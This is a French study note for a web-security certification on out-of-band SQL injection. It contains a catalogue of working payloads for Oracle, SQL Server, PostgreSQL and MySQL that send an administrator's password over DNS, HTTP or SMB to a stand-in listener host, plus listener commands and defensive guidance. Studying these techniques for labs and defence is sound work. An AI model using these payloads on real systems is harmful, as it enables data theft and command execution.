---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# SQL injection using out-of-band techniques

## En bref
Quand la requête SQL est exécutée de manière asynchrone, la réponse HTTP ne dépend plus ni du résultat, ni d'une erreur, ni du temps d'exécution. Il reste encore une technique : faire émettre par le serveur de base de données une interaction réseau vers une machine contrôlée par l'attaquant (OAST, out-of-band application security testing).

Deux usages :
- **Détection** : provoquer une requête DNS vers son domaine. Si elle apparaît dans le journal, l'injection est confirmée.
- **Exfiltration** : placer le résultat d'une sous-requête dans le nom d'hôte (`motdepasse.COLLAB`). La donnée arrive directement dans la requête DNS, sans extraction caractère par caractère.
- **Forme conditionnelle** : une condition peut aussi déclencher l'interaction (`IF ... exec xp_dirtree`), ce qui donne un booléen sur un canal qui marche en asynchrone.

Argument de coût : l'OAST sort la valeur entière en une seule requête, là où les techniques booléennes et temporelles coûtent un caractère par requête. Pour un mot de passe de 20 caractères : environ 140 requêtes en dichotomie et jusqu'à 720 en énumération (voir [[Blind-SQL-injection]]), contre une seule interaction (deux à quatre avec découpage). Nuance : la requête unique n'est vraie que si la valeur tient dans un nom DNS (63 caractères par étiquette, 253 au total) et si le moteur est configuré pour sortir sur le réseau. Sinon, retour au booléen ou au temps. C'est un choix de coût, pas une règle : privilèges, correctifs et filtrage réseau décident.

Cette note est la référence détaillée de l'out-of-band. La note [[Blind-SQL-injection]] n'en garde que la synthèse. Pour le temps : [[Blind SQLi - Triggering time delay]].

## Pourquoi le DNS
- Les réseaux de production laissent presque toujours sortir le DNS car il est indispensable.
- La base n'a pas besoin de joindre l'attaquant en TCP : il suffit qu'elle résolve un nom dont l'attaquant contrôle le serveur DNS faisant autorité.

## Outils d'écoute
- **Burp Collaborator** : serveur fournissant DNS, HTTP et SMTP. Le client intégré à Burp Suite Professional génère un sous-domaine unique, puis "Poll now" liste les interactions. Domaine actuel : `oastify.com` (ancien : `burpcollaborator.net`).
- **interactsh** et **écoute locale** (HTTP, SMB) : voir "Alternatives sans Collaborator" plus bas. Burp Community n'a pas de Collaborator.

## Types et variantes
Le déclencheur dépend du moteur de base de données. Fragments de détection d'origine, sans cadre d'injection (les versions complètes, utilisables dans un cookie, sont dans le catalogue) :

| SGBD       | **Payload de détection**                                                                                                                     |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual` |
| MSSQL      | `'; exec master..xp_dirtree '//COLLAB/a'--`                                                                                                  |
| PostgreSQL | `copy (select '') to program 'nslookup COLLAB'`                                                                                              |
| MySQL      | `SELECT LOAD_FILE('\\\\COLLAB\\a')` (Windows uniquement)                                                                                     |

Aucun de ces fragments n'est utilisable tel quel dans un cookie : Oracle n'a ni `SELECT` ni `UNION`, MSSQL n'a pas d'encodage, PostgreSQL n'a ni `';` ni `--`, MySQL n'a aucun cadre. D'où quatre cadres d'injection :

| Cadre | Forme | Moteurs |
|---|---|---|
| UNION | `xyz' UNION SELECT <expression> FROM dual--` | Oracle (une seule colonne de type chaîne, comme la requête de suivi de l'application) |
| Concaténation | `xyz'\|\|(<expression>)\|\|'` | Oracle |
| Empilé | `xyz'%3B<instruction>--` | SQL Server, PostgreSQL |
| AND | `xyz' AND <expression>-- -` | MySQL et MariaDB |

Synthèse par moteur : canal, requête empilée, privilège, fonction hexadécimale.

| Moteur | Canal | Empilé requis | Privilège ou configuration | Fonction hexadécimale |
|---|---|---|---|---|
| Oracle | DNS puis HTTP (XML) ; DNS seul (`UTL_INADDR`) | Non | XML : aucun droit connu mais base non corrigée ; `UTL_*` : droit `EXECUTE` et liste de contrôle d'accès | `RAWTOHEX(x)` |
| SQL Server | DNS puis SMB (HTTP selon WebClient) | Oui | Procédure souvent publique, À vérifier | `CONVERT(varchar(max),CAST(x AS varbinary(max)),2)` |
| PostgreSQL | DNS via `nslookup` (HTTP si une commande comme `curl` est lancée) | Oui | Superutilisateur ou `pg_execute_server_program` ; `dblink` en variante | `encode(convert_to(x,'UTF8'),'hex')` |
| MySQL, MariaDB | DNS puis SMB | Non (cadre AND) | Windows, `FILE`, `secure_file_priv` | `HEX(x)` |
| SQLite | aucun | sans objet | sans objet | `hex(x)` |

## Catalogue de payloads par moteur
Conventions : `COLLAB` = nom d'hôte du serveur d'écoute (sous-domaine Collaborator ou équivalent) ; `xyz` = valeur d'origine du cookie `TrackingId` ; le dernier `'` des formes équilibrées est fourni par la requête d'origine ; `<CONDITION>` = condition testée. Dans un cookie, `;` s'envoie `%3B`, le `+` de SQL Server `%2b`, le `%` d'une entité XML `%25`, le `#` `%23`, et les espaces `%20` (Burp Repeater : sélectionner, Ctrl+U). Les `|` sont échappés en `\|` dans les tableaux.

Statuts :
- **Vérifié** : syntaxe certaine, ou documentée par la cheat sheet PortSwigger. Cela ne veut pas dire rejoué : aucun payload de cette note n'a été rejoué, les statuts valent pour la syntaxe et non pour une exécution.
- **À vérifier** : cohérent mais non certain (version, privilèges, cadre d'injection).

### Oracle (pas de requête empilée, pas besoin d'en avoir)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Détection, DNS et HTTP, cadre UNION | `xyz' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--` | Base non corrigée ; `%` à envoyer `%25` dans un cookie ; `FROM dual` obligatoire | Vérifié (cheat sheet PortSwigger, aussi [[Blind-SQL-injection]]) |
| Détection, cadre concaténation | `xyz'\|\|(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual)\|\|'` | Valeur d'origine de type chaîne | À vérifier |
| Détection, base corrigée | `xyz'\|\|(SELECT UTL_INADDR.get_host_address('COLLAB') FROM dual)\|\|'` | Droit `EXECUTE` sur `UTL_INADDR` et liste de contrôle d'accès réseau (ORA-24247 sinon) ; DNS seulement | Vérifié pour la fonction (cheat sheet), le cadre est À vérifier |
| Exfiltration, DNS et HTTP, cadre UNION | `xyz' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.COLLAB/"> %remote;]>'),'/l') FROM dual--` | Une seule ligne, valeur non nulle, alphabet de nom DNS ; équilibre des apostrophes à l'intérieur du littéral XML | Vérifié (cheat sheet, structure) |
| Exfiltration avec hexadécimal | même forme avec `RAWTOHEX(password)` à la place de `password` | Évite casse et caractères spéciaux ; `RAWTOHEX` renvoie des majuscules | À vérifier |
| Exfiltration base corrigée | `xyz'\|\|(SELECT UTL_INADDR.get_host_address((SELECT RAWTOHEX(password) FROM users WHERE username='administrator')\|\|'.COLLAB') FROM dual)\|\|'` | Droits et liste de contrôle d'accès | À vérifier |
| Forme conditionnelle | `xyz'\|\|(SELECT CASE WHEN (<CONDITION>) THEN EXTRACTVALUE(xmltype('...entité vers COLLAB...'),'/l') ELSE NULL END FROM dual)\|\|'` | L'interaction n'a lieu que si la condition est vraie | À vérifier |
| Autres fonctions réseau | `UTL_HTTP.request('http://COLLAB/')`, `HTTPURITYPE('http://COLLAB/').getclob()`, `DBMS_LDAP.INIT('COLLAB',389)` | Droits `EXECUTE` et liste de contrôle d'accès réseau ; souvent retirés | À vérifier |

Anatomie de l'exfiltration Oracle : pas de variable ni d'exécution dynamique. La concaténation `'\|\|(...)\|\|'` à l'intérieur du littéral de l'entité XML remplace à elle seule le rôle de `declare`, `set` et `exec` côté SQL Server : la sous-requête est évaluée, puis son résultat s'insère dans l'URL de l'entité, juste avant `.COLLAB`.

Différences de version et de correctif :
- Le défaut de `EXTRACTVALUE(xmltype(...))` (traitement d'une entité externe de type paramètre) est corrigé dans les mises à jour trimestrielles ultérieures ; versions et date du correctif : À vérifier. Si le payload ne donne rien alors que le point d'injection est sain, basculer sur `UTL_INADDR`.
- Depuis Oracle 11g, les listes de contrôle d'accès réseau encadrent `UTL_INADDR`, `UTL_HTTP`, `UTL_TCP` (ORA-24247, voir [[Error-based SQL Injection]]). Le chemin XML passe, à ma connaissance, par un autre composant : À vérifier.
- `EXTRACTVALUE` est déclaré obsolète depuis Oracle 11.2 au profit de `XMLQUERY`, mais reste présent : À vérifier pour les versions récentes.
- `--` n'exige pas d'espace ; la concaténation est `\|\|` ; `FROM dual` est obligatoire.

### Microsoft SQL Server (requêtes empilées nécessaires)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Détection, DNS puis SMB | `xyz'%3Bexec master..xp_dirtree '//COLLAB/a'--` | Requête empilée ; la procédure est souvent exécutable par le rôle public (À vérifier) ; chemin UNC | Vérifié |
| Détection, forme conditionnelle | `xyz'%3BIF (<CONDITION>) exec master..xp_dirtree '//COLLAB/a'--` | Requête empilée | Vérifié (syntaxe) |
| Exfiltration complète | `xyz'%3Bdeclare @p varchar(1024)%3Bset @p=(SELECT TOP 1 password FROM users WHERE username='administrator')%3Bexec('master..xp_dirtree "//'%2b@p%2b'.COLLAB/a"')--` | Une seule valeur ; `exec('...')` obligatoire car les arguments d'une procédure ne sont pas des expressions | Vérifié (cheat sheet, forme générale) |
| Exfiltration sans exec dynamique | `xyz'%3Bdeclare @p varchar(1024)%3Bset @p='//'%2b(SELECT TOP 1 password FROM users WHERE username='administrator')%2b'.COLLAB/a'%3Bexec master..xp_dirtree @p--` | Idem | À vérifier |
| Exfiltration avec hexadécimal | remplacer `password` par `CONVERT(varchar(max),CAST(password AS varbinary(max)),2)` | Style 2 : hexadécimal sans préfixe `0x` ; passer d'abord en `varchar`, car un `nvarchar` donne de l'UTF-16 avec des octets nuls intercalés | Vérifié pour la fonction ; À vérifier dans le payload |
| Exfiltration conditionnelle | même chaîne avec `IF (<CONDITION>)` devant `exec(...)` | Requête empilée | À vérifier |
| Procédure voisine | `exec master..xp_fileexist '//COLLAB/a'` | Mêmes réserves | À vérifier |

Anatomie du payload MSSQL de détection : `'` ferme la chaîne, `;` empile une seconde requête, `xp_dirtree` avec un chemin UNC force la résolution DNS de l'hôte, `--` neutralise la suite de la requête d'origine.

Anatomie du payload MSSQL d'exfiltration :
1. `declare @p varchar(1024)` crée une variable.
2. `set @p=(SELECT TOP 1 ...)` y range le résultat ; la sous-requête doit renvoyer une seule valeur.
3. `exec('...')` exécute une chaîne construite, parce que les arguments d'une procédure stockée ne peuvent être qu'une constante ou une variable, jamais une expression : `exec master..xp_dirtree '//'+@p+'.COLLAB/a'` est donc invalide.
4. Les guillemets doubles à l'intérieur du `exec('...')` évitent de doubler les apostrophes.
5. `--` neutralise la fin.

Variante sans exec dynamique (À vérifier) : construire tout le chemin dans la variable, puis `exec master..xp_dirtree @p` (ligne correspondante du tableau).

Pièges SQL Server :
- La concaténation est `+`, à envoyer `%2b` dans un cookie, sinon il devient une espace et le payload casse sans bruit.
- Une valeur nulle donne `NULL + chaîne = NULL`, donc `exec(NULL)` ne fait rien : encadrer par `ISNULL(...,'vide')`.
- Un pilote qui accepte une seule instruction par requête rend toute la famille inutilisable.
- Windows tente d'abord le DNS puis SMB sur le port 445 ; le repli WebDAV sur HTTP dépend du service WebClient : À vérifier.
- Une résolution UNC peut aussi aboutir à une authentification NTLM sortante : attention si l'écoute est un serveur SMB (voir "Alternatives sans Collaborator").

### PostgreSQL (requêtes empilées possibles selon le pilote)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Détection, DNS via l'utilitaire du serveur | `xyz'%3Bcopy (select '') to program 'nslookup COLLAB'--` | Requête empilée ; superutilisateur ou rôle `pg_execute_server_program` (PostgreSQL 11 et suivants) ; binaire `nslookup` présent sur le serveur de base de données | Vérifié (cheat sheet) |
| Exfiltration | `xyz'%3BDO $$ DECLARE c text; BEGIN SELECT password INTO c FROM users WHERE username='administrator'; EXECUTE 'copy (select '''') to program ''nslookup ' \|\| c \|\| '.COLLAB'''; END $$--` | `COPY ... PROGRAM` n'accepte qu'une chaîne littérale, d'où le bloc anonyme et `EXECUTE` ; mêmes privilèges | À vérifier |
| Exfiltration avec hexadécimal | remplacer `c` par `encode(convert_to(c,'UTF8'),'hex')` | `encode(..., 'hex')` renvoie des minuscules | Vérifié pour la fonction |
| Forme conditionnelle | `DO $$ BEGIN IF (<CONDITION>) THEN ... END IF; END $$` (même exécution dynamique à l'intérieur) | Requête empilée | À vérifier |
| Sans privilège de superutilisateur | `SELECT dblink_connect('host=COLLAB user=a password=a dbname=a')` | Extension `dblink` installée ; le nom d'hôte peut contenir la donnée | À vérifier |

Pièges PostgreSQL :
- Sans requête empilée, aucune de ces formes ne marche, car `COPY` et `DO` sont des instructions, pas des expressions (le cadre concaténation `\|\|` du temps ne s'applique pas ici).
- `COPY ... TO PROGRAM` exécute une commande système : c'est une exécution de code, donc hors de la simple détection. À réserver aux labs et aux missions où l'opérateur l'a décidé, jamais plus loin qu'un `nslookup`.
- Les guillemets dollar (`$$`) évitent les apostrophes : voir [[SQL injection in different contexts]].
- Absence de `nslookup` dans les images minimales : échec silencieux.

### MySQL et MariaDB (Windows uniquement pour le chemin réseau)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Détection, DNS puis SMB | `xyz' AND LOAD_FILE('\\\\COLLAB\\a')-- -` | Serveur Windows ; privilège `FILE` ; `secure_file_priv` permissif ; guillemets simples, backslashs doublés dans le littéral | Vérifié (cheat sheet, forme `SELECT LOAD_FILE(...)`) |
| Exfiltration | `xyz' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator' LIMIT 1),'.COLLAB\\a'))-- -` | Mêmes prérequis ; une seule ligne | Vérifié (cheat sheet, forme générale ; aussi [[Blind-SQL-injection]]) |
| Exfiltration avec hexadécimal | remplacer `password` par `HEX(password)` | Majuscules en sortie | Vérifié pour la fonction |
| Forme conditionnelle | `xyz' AND IF(<CONDITION>,LOAD_FILE('\\\\COLLAB\\a'),0)-- -` | Mêmes prérequis | À vérifier |
| Écriture vers un chemin réseau | `SELECT ... INTO OUTFILE '\\\\COLLAB\a'` | Windows, `FILE`, instruction (pas une expression) | Vérifié (cheat sheet), peu pratique en cookie |
| Empilé | `xyz'%3BSELECT LOAD_FILE(...)-- -` | Rare | À vérifier |

Pièges MySQL et MariaDB :
- Sur un serveur Linux (cas fréquent dans les labs HTB), le chemin réseau n'est pas résolu : l'OAST DNS par SQL est en pratique inutilisable. `LOAD_FILE` fonctionne partout pour un fichier local ; c'est le chemin réseau UNC (`\\hôte\partage`) qui ne marche que sous Windows.
- `secure_file_priv` fixé à une valeur non vide ou à `NULL` bloque `LOAD_FILE` (À vérifier pour les chemins réseau).
- `--` exige un caractère après (`-- -`).
- MariaDB : mêmes fonctions et mêmes restrictions, différences non vérifiées.
- Une valeur nulle dans `CONCAT` donne `NULL`, donc `LOAD_FILE(NULL)` sans interaction : `IFNULL(...,'vide')`.

### SQLite
Aucune fonction réseau native : l'out-of-band par SQL n'existe pas en pratique. `load_extension` est désactivé par défaut. Rester sur le booléen, le temps par calcul lourd ou l'erreur conditionnelle (voir [[Blind SQLi - Triggering time delay]]).

## Contraintes d'exfiltration

| Contrainte | Fait | Conséquence pratique |
|---|---|---|
| Longueur d'une étiquette | 63 octets au maximum entre deux points | Découper en tranches de 60 ou moins (`SUBSTR`, `SUBSTRING`) ; avec l'hexadécimal, 60 caractères hexadécimaux font 30 octets de donnée |
| Longueur du nom complet | 253 caractères en notation textuelle (255 sur le réseau) | Le nom Collaborator occupe environ 45 caractères (À vérifier) : il reste de l'ordre de 200 caractères, étiquettes et points compris ; viser une ou deux étiquettes par requête |
| Alphabet | Lettres, chiffres et tiret ; pas de tiret en début ou fin d'étiquette ; le tiret bas passe souvent mais n'est pas garanti | Hexadécimal systématique pour tout ce qui n'est pas alphanumérique minuscule |
| Casse | Le DNS ne distingue pas les majuscules et des résolveurs en brouillent volontairement la casse (aléa de casse contre l'usurpation) | Un mot de passe sensible à la casse revient déformé : hexadécimal obligatoire, décodage insensible à la casse (`RAWTOHEX`, `HEX` donnent des majuscules) |
| Encodage hexadécimal | Double la longueur ; fonction propre à chaque moteur (tableau de synthèse) | Décoder : `echo 61646d696e \| xxd -r -p` |
| Découpage | Une requête par tranche : `SUBSTR(h,1,60)`, `SUBSTR(h,61,60)`, ... | Un préfixe fixe par tranche (`1.`, `2.`) pour ordonner les interactions reçues, qui ne sont pas garanties dans l'ordre |
| Plusieurs lignes | L'affectation ou l'expression échoue avant la requête DNS | `TOP 1`, `LIMIT 1`, `ROWNUM=1` ; ou agréger (`STRING_AGG`, `GROUP_CONCAT`, `string_agg`, `LISTAGG`) puis découper |
| Valeur nulle | `NULL` concaténé donne `NULL` (MySQL, MSSQL) ou une chaîne vide (Oracle, donc nom invalide) | `COALESCE`, `ISNULL`, `IFNULL`, ou un préfixe constant |
| Cache du résolveur | Un même nom déjà résolu n'est pas redemandé pendant la durée de vie de l'entrée | Un préfixe unique (compteur ou aléa) à chaque essai, sinon un rejeu ne produit aucune nouvelle interaction |
| Encodage URL dans un cookie | `;` en `%3B`, `+` en `%2b`, `%` en `%25`, `#` en `%23`, espaces en `%20`, backslash en `%5C` | Un `+` non encodé devient une espace et change la requête sans erreur visible |
| Échec silencieux | Tout est asynchrone : aucune erreur n'est visible | Valider chaque étape : d'abord une interaction constante (sans donnée), puis avec une donnée connue (`'test'`), puis avec la vraie sous-requête ; une seule modification à la fois |
| Interactions multiples | Un même événement peut produire plusieurs requêtes DNS (résolveurs redondants, DNS puis HTTP) | Ne pas compter les interactions comme des événements distincts |
| Débit et ordre | Aucune garantie de délai ni d'ordre | Attendre au moins quelques dizaines de secondes avant de conclure à un échec |

## Comment détecter
1. **Obtenir une adresse d'écoute** : sous-domaine Collaborator (bouton "Copy to clipboard" du client, Burp Suite Professional) ou autre écoute (voir "Alternatives sans Collaborator").
2. **Un préfixe par moteur** : un seul sous-domaine pour plusieurs payloads ne dit pas lequel a déclenché. Préfixer l'étiquette (`ora.`, `mssql.`, `pg.`, `mysql.`).
3. **Un payload à la fois**, avec Repeater, en commençant par Oracle pour les labs, puis les autres. Le moteur peut aussi se déduire d'autres signaux (tableau des syntaxes de [[Blind-SQL-injection]]).
4. **Attendre et lire** DNS et HTTP, avec l'adresse source de l'interaction (clic sur "Poll now" avec Collaborator). Les résolutions peuvent arriver plusieurs dizaines de secondes plus tard. Une interaction qui vient du serveur web et non du serveur de base de données (prévisualisation d'URL, antivirus, passerelle) est un faux positif possible, ou indique un autre défaut (par exemple une requête côté serveur).
5. **Confirmer par un contrôle négatif** : même payload sans l'hôte de l'attaquant, ou avec un hôte non écouté. Aucune interaction ne doit apparaître.

## Comment exploiter (principe)
1. Repérer un point d'injection où la réponse ne varie jamais.
2. Identifier le SGBD, ou tester les payloads de détection l'un après l'autre.
3. Confirmer l'interaction avec une valeur constante (aucune donnée).
4. Remplacer le sous-domaine par `RÉSULTAT.COLLAB` pour sortir la donnée : d'abord une donnée connue (`'test'`), puis lire le résultat dans le nom de la requête DNS reçue.
5. Adapter la sous-requête à la cible : une seule ligne (`TOP 1` sur MSSQL, `LIMIT 1` sur PostgreSQL et MySQL, `ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY` sur Oracle) ; une partie à la fois (`SUBSTR`, `SUBSTRING`) si la valeur dépasse une étiquette ; hexadécimal si l'alphabet n'est pas sûr ; valeur nulle neutralisée (`COALESCE`, `ISNULL`) ; préfixe unique pour éviter le cache. Voir "Contraintes d'exfiltration".
6. Encoder le payload en URL s'il passe dans un cookie ou un paramètre, puis décoder l'hexadécimal reçu.

## Alternatives sans Collaborator
Situation de l'opérateur : Burp Community Edition (pas de Collaborator) ; le filtre réseau (Fortinet) bloque les domaines `oast.*` utilisés par les serveurs publics d'interactsh. Aucune technique de contournement du filtre n'est proposée : les options ci-dessous respectent la politique du réseau.
- **Labs PortSwigger** : le pare-feu des labs n'autorise vraisemblablement que le Collaborator public de PortSwigger (À vérifier). Dans ce cas, un serveur d'écoute personnel ne peut pas recevoir l'interaction et la vérification de réussite du lab ne verra rien. Option réaliste : Burp Suite Professional ou son essai, qui fournit le client Collaborator. Si le filtre Fortinet bloque aussi `oastify.com` (À vérifier), la demande d'une autorisation explicite à l'administrateur du réseau est la voie normale ; ne pas chercher à l'éviter. Les cases des labs OAST ne peuvent être cochées en confiance que si l'opérateur a effectivement disposé d'un Collaborator.
- **HTB ou CTF** : l'écoute locale sur l'adresse du VPN (interface `tun0`) fonctionne dès que la cible peut joindre cette adresse directement. Canaux :
	- HTTP : `python3 -m http.server 80` ou `nc -lvnp 80`, avec une adresse IP littérale dans le payload (`http://ADRESSE_VPN/`). Pour Oracle, c'est l'entité XML ; la donnée peut être mise dans le chemin (`http://ADRESSE_VPN/'\|\|(SELECT ...)\|\|'`), ce qui évite la limite des étiquettes DNS.
	- SMB : `impacket-smbserver partage . -smb2support` pour un chemin UNC (`//ADRESSE_VPN/partage` côté SQL Server ; MySQL sous Windows). Attention : la connexion SMB peut transmettre un défi d'authentification NTLM du compte du service ; le traiter comme une donnée sensible et ne pas le réutiliser hors du périmètre.
	- DNS : ne revient pas vers l'opérateur si la cible utilise un résolveur interne (le nom n'est jamais demandé à l'adresse VPN). Ne pas conclure à l'absence de faille sur ce seul constat.
	- Vérifier la capture : `sudo tcpdump -i tun0 -n 'tcp port 80 or tcp port 445 or udp port 53'`.
- **interactsh-client** : d'après l'analyse, le binaire est présent dans `~/go/bin`. L'ajouter au PATH, par exemple avec `export PATH="$PATH:$HOME/go/bin"` dans `~/.zshrc`, puis lancer `interactsh-client`. Avec les serveurs publics par défaut (domaines `oast.*`), il est bloqué par le filtre actuel : à utiliser depuis un réseau où l'accès est autorisé, ou avec l'option `-server` vers son propre serveur.
- **Serveur interactsh auto-hébergé** : pour les missions autorisées, serveur sur une machine sous le contrôle de l'opérateur ou de l'équipe, avec un domaine dédié (enregistrements NS vers cette machine), les ports nécessaires ouverts (DNS 53 en UDP et TCP, HTTP 80, HTTPS 443, éventuellement SMTP et SMB) et un jeton d'accès (`-token`). Avantage décisif en mission : les données du client ne transitent pas par l'infrastructure d'un tiers. Le détail de mise en place (options, ports) est À vérifier dans la documentation du projet avant usage.
- Ce que ces alternatives ne remplacent pas : l'examen BSCP et les labs vérifiés par Collaborator (règles de l'examen : À vérifier).

## Pièges et points d'attention BSCP
- **Privilèges** : `xp_dirtree` est une procédure non documentée, ouverte au rôle public dans beaucoup d'installations par défaut (À vérifier selon version et durcissement). `COPY ... TO PROGRAM` (superutilisateur ou rôle `pg_execute_server_program`) et `UTL_INADDR` (listes de contrôle d'accès réseau) sont les plus restreints. Les requêtes empilées sont courantes sur MSSQL, rares sur MySQL, variables sur PostgreSQL, et jamais utiles sur Oracle, qui n'en a pas besoin.
- **Échec silencieux, sous-requête à plusieurs lignes** : l'instruction échoue avant la résolution DNS, donc aucune interaction et aucun message. Erreurs correspondantes : MSSQL erreur 512, Oracle ORA-01427, PostgreSQL "more than one row returned by a subquery used as an expression", MySQL erreur 1242. Correctif : limiter à une ligne, ou agréger (`STRING_AGG` sur SQL Server 2017 et suivants, `GROUP_CONCAT` sur MySQL, `string_agg` sur PostgreSQL, `LISTAGG` sur Oracle 11g R2 et suivants, version À vérifier pour chacun). Piège inverse sur MSSQL : `SELECT @p=password FROM users` (sans parenthèses) n'échoue pas, il garde la dernière ligne sans prévenir.
- **Échec silencieux, encodage** : un espace ou un `+` mal géré dans le cookie fait échouer l'injection sans message d'erreur, et comme tout est asynchrone, on ne voit rien (voir le tableau des contraintes).
- **Réseau** : si le DNS sortant est bloqué, ou si le résolveur interne n'interroge pas Internet, la technique ne sert à rien. Ne pas conclure à l'absence de faille.
- **Moteur du lab d'exfiltration** : Oracle probable, à confirmer par l'opérateur. À l'examen, savoir réécrire de mémoire : détection `EXTRACTVALUE(xmltype(...))`, exfiltration par `'\|\|(SELECT ...)\|\|'` dans l'URL de l'entité. Détail qui piège : le `%` du `% remote` à encoder `%25` dans un cookie, et `FROM dual` obligatoire.
- **Mission réelle** : le Collaborator public appartient à PortSwigger, les données exfiltrées transitent par leur infrastructure. Il faut un Collaborator privé ou un `interactsh` auto-hébergé, et ne jamais faire sortir de données client vers un tiers.

## Prévention
La cause racine, c'est la concaténation de l'entrée utilisateur dans la requête. Les requêtes paramétrées la suppriment, tout le reste n'est que de la défense en profondeur. Pour le tronc commun (réponses uniformes, moindre privilège, filtrage sortant), voir la section Prévention de [[Blind-SQL-injection]]. Propre à l'out-of-band :

Côté infrastructure, on filtre le DNS sortant des serveurs de base de données et on retire les droits inutiles (`xp_dirtree`, `COPY PROGRAM`). Une requête DNS inhabituelle émise par un serveur de base de données est un signal fort : elle mérite une règle de détection, dans Wazuh par exemple.

Par moteur :
- Oracle : retirer `EXECUTE` à `PUBLIC` sur `UTL_INADDR`, `UTL_HTTP`, `UTL_TCP`, `HTTPURITYPE` ; listes de contrôle d'accès réseau restrictives ; appliquer les mises à jour trimestrielles.
- SQL Server : retirer `EXECUTE` sur `xp_dirtree` et `xp_fileexist` au rôle public ; compte de service sans accès réseau sortant.
- PostgreSQL : aucun compte applicatif superutilisateur, pas de rôle `pg_execute_server_program`, extension `dblink` non installée.
- MySQL et MariaDB : aucun privilège `FILE` pour le compte applicatif, `secure_file_priv` restrictif.

Côté réseau : filtrer aussi HTTP, HTTPS et SMB (445) sortants depuis le serveur de base de données, pas uniquement DNS ; imposer un résolveur interne qui ne résout pas les domaines externes depuis ce serveur.

Côté détection : journaliser les résolutions DNS du serveur de base de données et alerter sur les noms longs ou très variés (signe d'exfiltration).

## Labs PortSwigger
Aucune case n'est cochée dans cette note. [[Blind-SQL-injection]] annonce les deux labs comme terminés le 2026-11-02, mais ils exigent un Collaborator, l'opérateur n'a que Burp Community, et l'outil employé n'est pas consigné. Cases laissées vides, à confirmer par l'opérateur (niveau Practitioner pour toute la catégorie, d'après cette note).
- [ ] Blind SQL injection with out-of-band interaction (Oracle probable, à confirmer par l'opérateur)
- [ ] Blind SQL injection with out-of-band data exfiltration (Oracle probable, à confirmer par l'opérateur)

## Journal des labs
### Lab: Blind SQL injection with out-of-band interaction
- **Énoncé** : injection aveugle dans le cookie de suivi, dont la valeur est placée dans une requête SQL. La requête est exécutée de façon asynchrone et n'a aucun effet sur la réponse de l'application, mais on peut provoquer des interactions avec un domaine externe. Objectif : provoquer une résolution DNS vers Burp Collaborator.
- **Moteur et variante** : Oracle probable, à confirmer par l'opérateur ; détection simple, sans extraction.
- **Signal observé** : interaction DNS reçue par le serveur d'écoute.
- **Méthode** : à compléter, solution non consignée.
- **Payloads clés** (exacts) : à compléter. Formes candidates dans le catalogue Oracle, non rejouées.
- **Pièges rencontrés** : à compléter.
- **Statut et date** : à confirmer par l'opérateur. Annoncé terminé le 2026-11-02 par [[Blind-SQL-injection]], sans outil consigné.

### Lab: Blind SQL injection with out-of-band data exfiltration
- **Énoncé** : même contexte que le lab précédent (cookie de suivi, requête asynchrone), avec une table `users` contenant `username` et `password`. Objectif : exfiltrer par une interaction réseau le mot de passe de `administrator`, puis se connecter avec ce compte. Énoncé reformulé d'après l'intitulé du lab, à confirmer par l'opérateur.
- **Moteur et variante** : Oracle probable, à confirmer par l'opérateur ; exfiltration par DNS.
- **Signal observé** : interaction DNS dont le nom contient la valeur extraite.
- **Méthode** : à compléter, solution non consignée.
- **Payloads clés** (exacts) : à compléter. Forme candidate : ligne "Exfiltration, DNS et HTTP, cadre UNION" du catalogue Oracle, non rejouée.
- **Pièges rencontrés** : à compléter.
- **Statut et date** : à confirmer par l'opérateur. Annoncé terminé le 2026-11-02 par [[Blind-SQL-injection]], sans outil consigné.

## Liens
- [[SQL-injection]]
- [[Blind-SQL-injection]]
- [[Blind SQLi - Triggering time delay]]
- [[Error-based SQL Injection]]
- [[SQL-injection-Union-Attacks]]
- [[SQL injection in different contexts]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
